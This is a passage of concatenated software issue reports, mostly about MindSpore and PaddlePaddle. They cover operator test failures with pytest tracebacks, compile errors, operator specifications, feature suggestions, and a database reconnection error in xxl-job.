need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden else: self.enable_tuple_broaden = False self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) is_sink_mode = args and isinstance(args[0], Tensor) and args[0].virtual_flag if auto_parallel_mode and _need_to_full() and not is_sink_mode and obj.auto_parallel_compile_and_run(): args_list = _to_full_tensor(args, _get_device_num(), _get_global_rank()) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E RuntimeError: mindspore/ccsrc/backend/kernel_compiler/cpu/eigen/eigh_cpu_kernel.cc:50 InitKernel] wrong array shape, A should be a matrix, but got [6 X 8] def test_eigh_eigvals_only_type_true(): input_a = Tensor(np.random.randn(4, 4), dtype=mstype.float32) fact = EighMock(attributes={'a': input_a, 'eigvals_only': True}) &gt; fact.forward_mindspore_impl() test_eigh.py:319: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;MindSporeTest.share.utils.wrap_op.&lt;locals&gt;.WrapOp object at 0x7faf82336a10&gt; def forward_mindspore_impl(self): output_w, output_v = eigh(a=self.a, b=self.b, lower=self.lower, eigvals_only=self.eigvals_only, _type=self._type, overwrite_a=self.overwrite_a, overwrite_b=self.overwrite_a, check_finite=self.check_finite, turbo=self.turbo, &gt; eigvals=self.eigvals) E ValueError: too many values to unpack (expected 2) ../share/ops/primitive/eigh_ops.py:55: ValueError 直接修改官网测试样例，加入eigvals_only=True也会报同样的错误 import mindspore.numpy as mnp from mindspore.common import Tensor from mindspore.scipy.linalg import eigh A = Tensor([[6., 3., 1., 5.], [3., 0., 5., 1.], [1., 5., 6., 2.], [5., 1., 2., 2.]]) w, v = eigh(A,eigvals_only=True) print(mnp.sum(mnp.dot(A, v) - mnp.dot(v, mnp.diag(w))) &lt; 1e-10) 结果： Traceback (most recent call last): File ""/home/zhangxuebao/MindSporeTest/doc/aaa.py"", line 6, in &lt;module&gt; w, v = eigh(A,eigvals_only=True) ValueError: too many values to unpack (expected 2) def test_eigh_input_b_not_tensor_error(): input_a = Tensor(np.random.randn(9, 9), dtype=mstype.float64) input_b = ""test"" fact = EighMock( attributes={'a': input_a, 'lower': False, 'overwrite_a': True, 'overwrite_b': True, 'turbo': False}) fact.forward_mindspore_impl() fact.forward_scipy_impl() fact.forward_cmp() with pytest.raises(TypeError): &gt; eigh(a=input_a, b=input_b) E Failed: DID NOT RAISE &lt;class 'TypeError'&gt; _____________________________________________________________ test_eigh_input_b_not_tensor_error ______________________________________________________________ @Author('zwx1059847') @Level3 @SKIP_ENV_DAVINCI_EXECUTOR() def test_eigh_input_b_not_tensor_error(): input_a = Tensor(np.random.randn(9, 9), dtype=mstype.float64) input_b = ""test"" with pytest.raises(TypeError): &gt; eigh(a=input_a, b=input_b) E Failed: DID NOT RAISE &lt;class 'TypeError'&gt; test_eigh.py:464: Failed ____________________________________________________________ test_eigh_input_lower_not_bool_error _____________________________________________________________ @Author('zwx1059847') @Level3 @SKIP_ENV_DAVINCI_EXECUTOR() def test_eigh_input_lower_not_bool_error(): input_a = Tensor(np.random.randn(9, 9), dtype=mstype.float32) fact = EighMock(attributes={'a': input_a, 'lower': ""test""}) with pytest.raises(TypeError): &gt; fact.forward_mindspore_impl() E Failed: DID NOT RAISE &lt;class 'TypeError'&gt; test_eigh.py:485: Failed _________________________________________________________ test_eigh_input_eigvals_only_not_bool_error _________________________________________________________ @Author('zwx1059847') @Level3 @SKIP_ENV_DAVINCI_EXECUTOR() def test_eigh_input_eigvals_only_not_bool_error(): input_a = Tensor(np.random.randn(6, 6), dtype=mstype.float32) fact = EighMock(attributes={'a': input_a, 'eigvals_only ': ""test""}) with pytest.raises(TypeError): &gt; fact.forward_mindspore_impl() E Failed: DID NOT RAISE &lt;class 'TypeError'&gt; test_eigh.py:506: Failed _________________________________________________________ test_eigh_input_overwrite_a_not_bool_error __________________________________________________________ @Author('zwx1059847') @Level3 @SKIP_ENV_DAVINCI_EXECUTOR() def test_eigh_input_overwrite_a_not_bool_error(): input_a = Tensor(np.random.randn(9, 9), dtype=mstype.float32) fact = EighMock(attributes={'a': input_a, 'overwrite_a': ""test""}) with pytest.raises(TypeError): &gt; fact.forward_mindspore_impl() E Failed: DID NOT RAISE &lt;class 'TypeError'&gt; test_eigh.py:527: Failed _________________________________________________________ test_eigh_input_overwrite_b_not_bool_error __________________________________________________________ @Author('zwx1059847') @Level3 @SKIP_ENV_DAVINCI_EXECUTOR() def test_eigh_input_overwrite_b_not_bool_error(): input_a = Tensor(np.random.randn(9, 9), dtype=mstype.float32) fact = EighMock(attributes={'a': input_a, 'overwrite_b': ""test""}) with pytest.raises(TypeError): &gt; fact.forward_mindspore_impl() E Failed: DID NOT RAISE &lt;class 'TypeError'&gt; test_eigh.py:548: Failed _________________________________________________________ test_eigh_input_check_finite_not_bool_error _________________________________________________________ @Author('zwx1059847') @Level3 @SKIP_ENV_DAVINCI_EXECUTOR() def test_eigh_input_check_finite_not_bool_error(): input_a = Tensor(np.random.randn(9, 9), dtype=mstype.float32) fact = EighMock(attributes={'a': input_a, 'check_finite': ""test""}) with pytest.raises(TypeError): &gt; fact.forward_mindspore_impl() E Failed: DID NOT RAISE &lt;class 'TypeError'&gt; test_eigh.py:572: Failed ____________________________________________________________ test_eigh_input_turbo_not_bool_error _____________________________________________________________ @Author('zwx1059847') @Level3 @SKIP_ENV_DAVINCI_EXECUTOR() def test_eigh_input_turbo_not_bool_error(): input_a = Tensor(np.random.randn(9, 9), dtype=mstype.float32) fact = EighMock(attributes={'a': input_a, 'turbo': ""test""}) with pytest.raises(TypeError): &gt; fact.forward_mindspore_impl() E Failed: DID NOT RAISE &lt;class 'TypeError'&gt; test_eigh.py:596: Failed ___________________________________________________________ test_eigh_input_eigvals_not_tuple_error ___________________________________________________________ @Author('zwx1059847') @Level3 @SKIP_ENV_DAVINCI_EXECUTOR() def test_eigh_input_eigvals_not_tuple_error(): input_a = Tensor(np.random.randn(9, 9), dtype=mstype.float32) fact = EighMock(attributes={'a': input_a, 'eigvals ': ""test""}) with pytest.raises(TypeError): &gt; fact.forward_mindspore_impl() E Failed: DID NOT RAISE &lt;class 'TypeError'&gt; test_eigh.py:620: Failed 测试样例： from mindspore.common import dtype as mstype import mindspore.numpy as mnp from mindspore.common import Tensor from mindspore.scipy.linalg import eigh A = Tensor([[6., 3., 1., 5.], [3., 0., 5., 1.], [1., 5., 6., 2.], [5., 1., 2., 2.]],dtype=mstype.int32) w, v = eigh(A) print(mnp.sum(mnp.dot(A, v) - mnp.dot(v, mnp.diag(w))) &lt; 1e-10) 结果： [ERROR] PYNATIVE(9873,7f603f913740,python):2022-01-17-15:19:37.882.937 [mindspore/ccsrc/pipeline/pynative/pynative_execute.cc:105] PynativeExecutorTry] Traceback (most recent call last): File ""/home/zhangxuebao/MindSporeTest/doc/aaa.py"", line 7, in &lt;module&gt; print(mnp.sum(mnp.dot(A, v) - mnp.dot(v, mnp.diag(w))) &lt; 1e-10) File ""/root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/numpy/math_ops.py"", line 752, in dot res = _matmul_t(a_aligned, b_aligned) File ""/root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 280, in __call__ return _run_op(self, self.name, args) File ""/root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 61, in wrapper results = fn(*arg, **kwargs) File ""/root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 719, in _run_op output = real_run_op(obj, op_name, args) File ""/root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 453, in __check__ fn(*(x[track] for x in args)) File ""/root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/ops/operations/math_ops.py"", line 1366, in check_dtype validator.check_tensors_dtypes_same_and_valid(args, mstype.float_type + mstype.int_type, self.name) File ""/root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/_checkparam.py"", line 534, in check_tensors_dtypes_same_and_valid Validator.check_types_same_and_valid(args, tensor_types, prim_name) File ""/root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/_checkparam.py"", line 527, in check_types_same_and_valid reduce(_check_types_same, elem_types) File ""/root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/_checkparam.py"", line 521, in _check_types_same raise TypeError(f""For '{prim_name}', type of '{arg2_name}' should be same as '{arg1_name}',"" TypeError: For 'MatMul', type of 'x2' should be same as 'x1', but got 'x1' with type Tensor[Int32] and 'x2' with type Tensor[Float32]. def test_eigh_a_shape_4x4_dtype_fp32(): input_a = Tensor(np.random.randn(4, 4), dtype=mstype.float32) fact = EighMock(attributes={'a': input_a}) &gt; fact.forward_cmp() test_eigh.py:39: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/eigh_ops.py:85: in forward_cmp allclose_nparray(m_sum_one, m_sum_two, self.loss, self.loss) ../share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[ 0.28467518, 1.539513 , -0.8596515 , 0.6055777 ], [-0.89297664, 0.26967227, 0.57503927, -0.6365338...75977254, 0.01880503, -1.3439527 ], [ 0.66835153, -0.39449775, -0.08861184, 2.5893922 ]], dtype=float32) data_me = array([[-1.1430724 , -0.28412724, 0.14471231, 1.4892524 ], [-1.7024843 , 0.6168195 , -0.07025156, 1.0274749...68264294, -0.07250051, -1.1878539 ], [ 0.66835165, -0.3944978 , -0.08861207, 2.5893922 ]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[ 0.28467518 1.539513 -0.8596515 0.6055777 -0.89297664 0.26967227 E 0.57503927 -0.6365338 -1.3964624 -0.75977254 0.01880503 -1.3439527 ] E data_me_error:[-1.1430724 -0.28412724 0.14471231 1.4892524 -1.7024843 0.6168195 E -0.07025156 1.0274749 -1.4487965 -0.68264294 -0.07250051 -1.1878539 ] E loss:[1.4277475 1.8236402 1.0043638 0.88367474 0.8095076 0.34714723 E 0.64529085 1.6640086 0.05233407 0.0771296 0.09130554 0.15609872] ../share/utils.py:23: AssertionError def test_eigh_a_dtype_fp64(): input_a = Tensor(np.random.randn(7, 7), dtype=mstype.float64) fact = EighMock(attributes={'a': input_a}) &gt; fact.forward_cmp() test_eigh.py:89: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/eigh_ops.py:85: in forward_cmp allclose_nparray(m_sum_one, m_sum_two, self.loss, self.loss) ../share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[-1.54528263, -0.44027579, 1.00911204, -0.88867018, -0.80801376, -0.77578674, -0.92849921], [-0...22028851], [-1.92169323, 0.33238886, -0.38743739, 0.1632486 , 0.0699377 , -0.02574488, -2.0049875 ]]) data_me = array([[-2.42899803, 1.08439944, 0.11015726, -0.08471145, -0.56743034, 1.11529882, 0.74597362], [-0...63900918], [-1.92169323, 0.33238886, -0.38743739, 0.1632486 , 0.0699377 , -0.02574488, -2.0049875 ]]) rtol = 1e-05, atol = 1e-05 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[-1.54528263 -0.44027579 1.00911204 -0.88867018 -0.80801376 -0.77578674 E -0.92849921 -0.95617131 -0.51153116 -0.37891754 0.92438171 0.91403007 E -0.76012749 1.23710641 -0.38543647 0.59644094 -0.51591271 0.21927268 E -2.0681638 0.40637884 0.34690559 2.24517816 1.60225791 0.01186488 E -0.41908495 0.24166174 0.32963647 0.19277405 -0.80040549 0.34633912 E 0.82515287 -1.42717441 -0.36895085 -1.95945598 0.22677357 0.59961802 E -0.47859766 0.60587698 -0.28999387 -0.81955905 0.6058267 1.22028851] E data_me_error:[-2.42899803 1.08439944 0.11015726 -0.08471145 -0.56743034 1.11529882 E 0.74597362 -0.11796875 0.43491084 -1.05066893 0.02776054 -0.0262659 E -1.22519078 1.8926224 1.34112019 0.34822352 -0.13127951 -0.03832662 E -1.44389474 -0.83687727 -1.36253397 2.1533729 1.55704061 0.24498996 E 0.06199301 0.49044048 0.35674372 -0.00593693 -1.2389906 0.32569168 E 0.85451283 0.0122945 0.11954585 -2.18838714 0.3228669 0.2577186 E -0.35818256 0.41258208 0.17214115 -0.84796206 0.61233572 1.63900918] E loss:[0.88371541 1.52467523 0.89895478 0.80395874 0.24058342 1.89108556 E 1.67447283 0.83820256 0.946442 0.67175139 0.89662117 0.94029596 E 0.46506328 0.65551599 1.72655665 0.24821741 0.3846332 0.2575993 E 0.62426906 1.24325611 1.70943956 0.09180526 0.0452173 0.23312507 E 0.48107796 0.24877874 0.02710725 0.19871098 0.43858511 0.02064744 E 0.02935996 1.43946891 0.48849669 0.22893116 0.09609332 0.34189942 E 0.1204151 0.1932949 0.46213503 0.02840301 0.00650902 0.41872067] ../share/utils.py:23: AssertionError"
Fix Mac compile errors,"Issue: Solution: https://github.com/PaddlePaddle/Paddle/blob/71fa3ca9c4b1a7b5be569e32f8c2b5f659542f16/paddle/utils/tests/test_CustomStackTrace.cpp#L36-L49 Remove line 43 and line 44. For and are ,which means they can be used in lambda without being captured.   <code>: /Users/baidu/Documents/git_workspace/Paddle/paddle/utils/tests/test_CustomStackTrace.cpp:43:44: error: lambda capture 'countDown' is not required to be captured for this use [-Werror,-Wunused-lambda-capture] &amp;countDown, ^ /Users/baidu/Documents/git_workspace/Paddle/paddle/utils/tests/test_CustomStackTrace.cpp:44:44: error: lambda capture 'layerSize' is not required to be captured for this use [-Werror,-Wunused-lambda-capture] &amp;layerSize, ^ 2 errors generated. make[2]: *** [paddle/utils/tests/CMakeFiles/test_CustomStackTrace.dir/test_CustomStackTrace.cpp.o] Error 1 make[1]: *** [paddle/utils/tests/CMakeFiles/test_CustomStackTrace.dir/all] Error 2 make[1]: *** Waiting for unfinished jobs.... countDown layerSize constexpr"
[CT][MS][SparseFillEmptyRows]算子应该是支持bool类型，但是在gpu报错,"算子在gpu运行用例test_p_sparsefillemptyrows_dtype_bool 出现报错 提示TypeError: Select GPU operator[SparseFillEmptyRowsGrad] fail! Unsupported data type! def test_p_sparsefillemptyrows_dtype_bool(): n = np.random.randint(10, 20) dim1 = np.random.randint(1, n) input_list = [] indices = Tensor(np.random.randint(n, size=(dim1, 2)), dtype=mstype.int64) values = Tensor(dim1 * np.random.rand(dim1), dtype=mstype.bool_) dense_shape = Tensor([n, n], dtype=mstype.int64) default_value = Tensor(dim1, dtype=mstype.bool_) input_list.append(indices) input_list.append(values) input_list.append(dense_shape) input_list.append(default_value) fact = SparseFillEmptyRowsMock(inputs=input_list) fact.forward_cmp() test_sparsefillemptyrows.py:405: ../share/ops/primitive/sparsefillemptyrows_ops.py:128: in grad_cmp input_grad_mindspore = self.grad_mindspore_impl() ../share/ops/primitive/sparsefillemptyrows_ops.py:91: in grad_mindspore_impl Tensor(self.default_value), dout_grad) /root/miniconda3/envs/ns3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:651: in call raise err /root/miniconda3/envs/ns3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:647: in call output = self._run_construct(args, kwargs) /root/miniconda3/envs/ns3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:413: in <em>run_construct output = self.construct(*cast_inputs, **kwargs) ../share/grad.py:27: in construct return self.grad(self.network)(*inputs) /root/miniconda3/envs/ns3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:380: in after_grad return grad</em>(fn)(*args, **kwargs) /root/miniconda3/envs/ns3.7/lib/python3.7/site-packages/mindspore/common/api.py:97: in wrapper results = fn(*arg, **kwargs) /root/miniconda3/envs/ns3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:370: in after_grad out = _pynative_executor() self = &lt;mindspore.common.api._PyNativeExecutor object at 0x7f97fea9a450&gt; E TypeError: Select GPU operator[SparseFillEmptyRowsGrad] fail! Unsupported data type! E The supported data types are input[Int64 Int8], output[Int8 Int8]; input[Int64 Int16], output[Int16 In t16]; input[Int64 Int32], output[Int32 Int32]; input[Int64 Int64], output[Int64 Int64]; input[Int64 UInt8], ou tput[UInt8 UInt8]; input[Int64 UInt16], output[UInt16 UInt16]; input[Int64 Float16], output[Float16 Float16]; input[Int64 Float32], output[Float32 Float32]; input[Int64 Float64], output[Float64 Float64]; input[Int64 Comp lex64], output[Complex64 Complex64]; input[Int64 Complex128], output[Complex128 Complex128]; , but get input[I nt64 Bool ] output[Bool Bool ] /mode graph test_p_sparsefillemptyrows_dtype_bool   <code>: fact.grad_cmp() def __call__(self): """""" PyNative executor run grad graph. Return: The return object after running grad graph. """""" return self._executor()"
Example类addCriterion方法的建议,"对于代码 能不能修改成 这样做可以方便在SQL拼装时，不用再对数据做空判断   <code>: if (value == null) { throw new RuntimeException(""Value for "" + property + "" cannot be null""); } if (value == null) { retrun ; }"
移除libgmp依赖,原本用于加解密场景，21年已使用openssl替代，源码中已不再使用该库（搜索gmp.h使用为空），当前需要从如下两处地方移除： cmake文件 全部的安装指南；   <code>: libgmp
transpiler error,"seems parameter grad_to_block_id is missing while calling append_optimize_op   <code>: Traceback (most recent call last): File ""vgg16_fluid.py"", line 292, in &lt;module&gt; main() File ""vgg16_fluid.py"", line 253, in main pserver_prog = t.get_pserver_program(current_endpoint) File ""/usr/local/lib/python2.7/dist-packages/paddle/fluid/distribute_transpiler.py"", line 447, in get_pserver_program __append_optimize_op__(glb_op, opt_state_block) TypeError: __append_optimize_op__() takes exactly 3 arguments (2 given)"
在V2中如何设置参数初始化的随机数种子?,在paddle的v1中提供了 --seed 命令行选项，Fluid中在中也提供了seed参数，请问在v2版本中如何设置参数和dropout_layer的随机种子呢？   <code>: ParamAttr
【众智】【计算-AICPU开发】FractionalMaxPoolGrad,FractionalMaxPoolGrad 计算FractionalMaxPool的梯度。 接口目录：mindspore/ops/operations/_grad_ops.py overlapping Bool 属性 orig_input orig_output out_backprop row_pooling_sequence col_pooling_sequence y 对应底层算子 对应底层AICPU算子FractionalMaxPoolGrad https://www.tensorflow.org/api_docs/python/tf/raw_ops/FractionalMaxPoolGrad 3. 异常处理 4. 算子反向 无反向   <code>: class FractionalMaxPoolGrad(Primitive):
建议Fluid的softmax_with_cross_entropy支持输入大于2-D的场景,"目前Fluid的softmax_with_cross_entropy只支持2-D的logits和label输入，但输入大于2-D的场景也是有的，建议直接支持任意大于2-D的输入。 类似于下面功能：   <code>: def softmax_with_cross_entropy_any_rank(logits, label, soft_label=False, ignore_index=-100): """""" Expend paddle.fluid.layers.softmax_with_cross_entropy to support any rank input. Will do the softmax and cross entropy along the last dim of logits and label. Args: logits (Variable): The unscaled log probabilities, which is a (N + 1)-D tensor with shape [d1 x d2 x ... dN x K]. K is the class number. label (Variable): The ground truth which is a (N + 1)-D tensor. If soft_label is set to false, Label is a Tensor&lt;int64&gt; with shape [d1 x d2 x ... dN x 1]. If soft_label is set to true, Label is a Tensor&lt;float/double&gt; with shape [d1 x d2 x ... dN x K]. soft_label (bool): A flag to indicate whether to interpretate the given labels as soft labels. By default, soft_label is set to False. ignore_index (int): Specifies a target value that is ignored and does not contribute to the input gradient. Only valid if soft_label is set to False. Default: -100 Returns: The cross entropy loss is a (N + 1)-D tensor with shape [d1 x d2 x ... dN x 1]. """""" if len(logits.shape) &gt; 2: result_shape = list(logits.shape[:-1]) + [1] flatten_logits = layers.reshape(logits, shape=[-1, logits.shape[-1]]) flatten_label = layers.reshape(label, shape=[-1, label.shape[-1]]) flatten_result = layers.softmax_with_cross_entropy(flatten_logits, flatten_label, soft_label, ignore_index) result = layers.reshape(flatten_result, shape=result_shape) return result else: return layers.softmax_with_cross_entropy(logits, label, soft_label, ignore_index)"
【众智】【计算-AICPU开发】SdcaOptimizer,SdcaOptimizer Sdca优化器 接口目录：mindspore/ops/operations/nn_ops.py adaptive Bool 属性 num_sparse_features Int 属性 num_sparse_features_with_values Int 属性 num_dense_features Int 属性 num_loss_partitions Int 属性 num_inner_iterations Int 属性 loss_type String 属性 l1 Float 属性 l2 Float 属性 sparse_example_indices sparse_feature_indices sparse_feature_values dense_features example_weights example_labels sparse_indices sparse_weights dense_weights example_state_data out_example_state_data out_delta_sparse_weights out_delta_dense_weights 对应底层算子 对应底层AICPU算子SdcaOptimizerV2 无反向   <code>: class SdcaOptimizer(Primitive):
"[CT][MS][OP]RuntimeError, Calculate tiling failed",": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : pytest -s test_sparseadam.py::test_sparseadam_3x3x2_not_cpu pytest -s test_layernorm.py::test_lazyadam_param_shape_3x1x2_label_shape_2x2_indices_shape_2_lr_01_not_cpu   <code>: def test_sparseadam_3x3x2_not_cpu(): fact = SparseAdamFactory((3,3,2),(0,1),(2,6),epoch=3, lr=1e-2,beta1=0.9, beta2=0.999, eps=1e-08, weight_decay=0.0, loss_scale=1.0, locking=False, nesterov=False, dtype=np.float32,flag=False) fact.forward_cmp() pytest -s test_sparseadam.py::test_sparseadam_3x3x2_not_cpu ../operations/test_sparseadam.py:37: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/sparseadam_ops.py:93: in forward_cmp out_me = self.forward_mindspore_impl() ../share/ops/sparseadam_ops.py:67: in forward_mindspore_impl train_network(inputs, label) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:280: in __call__ out = self.compile_and_run(*inputs) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:543: in compile_and_run return _executor(self, *inputs, phase=self.phase) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/api.py:474: in __call__ return self.run(obj, *args, phase=phase) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/api.py:502: in run return self._exec_pip(obj, *args, phase=phase_real) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/api.py:69: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._Executor object at 0xffff693f3ed0&gt; obj = TrainOneStepCell&lt; (network): WithLossCell&lt; (_backbone): WrapOp&lt;&gt; (_loss_fn): SoftmaxCrossEntropyWithLogits&lt;&gt; &gt; (optimizer): Adam&lt;&gt; &gt; phase = '0train.1603651245347055872' args = (Tensor(shape=[2], dtype=Int32, value= [0, 1]), Tensor(shape=[2, 6], dtype=Float32, value= [[-7.47878551e-01, 3.01917...970253e+00], [-1.27448487e+00, -7.63100618e-03, -8.06399465e-01, -6.57159090e-01, -5.37567317e-01, 1.50504351e-01]])) fn = &lt;bound method TrainOneStepCell.construct of TrainOneStepCell&lt; (network): WithLossCell&lt; (_backbone): WrapOp&lt;&gt; (_loss_fn): SoftmaxCrossEntropyWithLogits&lt;&gt; &gt; (optimizer): Adam&lt;&gt; &gt;&gt; converted = True @_wrap_func def _exec_pip(self, obj, *args, phase=''): """"""Execute the generated pipeline."""""" fn = obj.construct converted, arguments_dict, parse_method = _convert_function_arguments(fn, *args) if not converted: raise RuntimeError('Process method parameter is failure') args_list = tuple(arguments_dict.values()) obj.__parse_method__ = parse_method &gt; return self._executor(args_list, phase) E RuntimeError: mindspore/ccsrc/runtime/device/ascend/executor/tiling/op_tiling_calculater.cc:179 CalculateTiling] Calculate tiling failed"
Random Data Op,"RFC We introduce a new random data op at the leaf level. The purpose of it is generate massive random data to send along the pipeline for stress testing the stability of execution tree. Like many leaf operators, we start with creating a schema. Internally we will pack the tensor data with randomly generated data. They may not make any sense to human eyes. But merely for the purpose to generate a data buffer to send along the pipeline. Here is python usage. def test_randomdataset_basic1(): print(""Test randomdataset basic"") Trail No. Task Description Related Issue(URL) 1 2   <code>: schema = ds.Schema() schema.add_column('image', de_type=mstype.uint8, shape=[2]) schema.add_column('label', de_type=mstype.uint8, shape=[1]) # apply dataset operations ds1 = ds.RandomDataset(schema=schema, num_samples=50, num_parallel_workers=4) ds1 = ds1.repeat(4) num_iter = 0 for data in ds1.create_dict_iterator(): # each data is a dictionary # in this example, each dictionary has keys ""image"" and ""label"" print(""{} image: {}"".format(num_iter, data[""image""])) print(""{} label: {}"".format(num_iter, data[""label""])) num_iter += 1 print(""Number of data in ds1: "", num_iter) assert(num_iter == 200)"
Update submodule akg,"Task Use this template for task tracking kind/task Task Description Update submodule akg, which fix the performance degradation of .   <code>: Fused_LambUpdateWithLR"
使用formslot时，自定义了tree，如何在查看时显示选择框,"自定义代码如下： 添加、编辑是效果如下： ** 现在想在点击查看是与添加、编辑一样，有一个选择框，该如何配置** 版本avue2.8.12   <code>: # code block &lt;template slot=""roomsForm"" slot-scope=""scope""&gt; &lt;el-tree :data=""roomList"" show-checkbox node-key=""id"" ref=""treeRoom"" :default-checked-keys=""roomTreeObj"" :props=""props""&gt; &lt;/el-tree&gt; &lt;/template&gt;"
build documentation don't need install Paddle before,"As building documentation don't need to install Paddle before (#3310:A better error message for gradient checker merged), refine the   <code>: paddle/scripts/docker/build.sh"
admin服务断网后，不会重连数据库,"16:21:34.313 logback [xxl-job, admin JobFailMonitorHelper] ERROR c.x.j.a.c.t.JobFailMonitorHelper - &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; xxl-job, job fail monitor thread error:{} org.springframework.dao.DataAccessResourceFailureException: Error querying database. Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLNonTransientConnectionException: No operations allowed after connection closed. The error may exist in file [D:\GitProject\xxl-job\xxl-job-admin\target\classes\mybatis-mapper\XxlJobLogMapper.xml] The error may involve com.xxl.job.admin.dao.XxlJobLogDao.findFailJobLogIds The error occurred while executing a query SQL: SELECT id FROM WHERE !( (trigger_code in (0, 200) and handle_code = 0) OR (handle_code = 200) ) AND = 0 ORDER BY id ASC Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLNonTransientConnectionException: No operations allowed after connection closed. ; SQL []; No operations allowed after connection closed.; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLNonTransientConnectionException: No operations allowed after connection closed. at org.springframework.jdbc.support.SQLExceptionSubclassTranslator.doTranslate(SQLExceptionSubclassTranslator.java:79) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:73) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:82) at 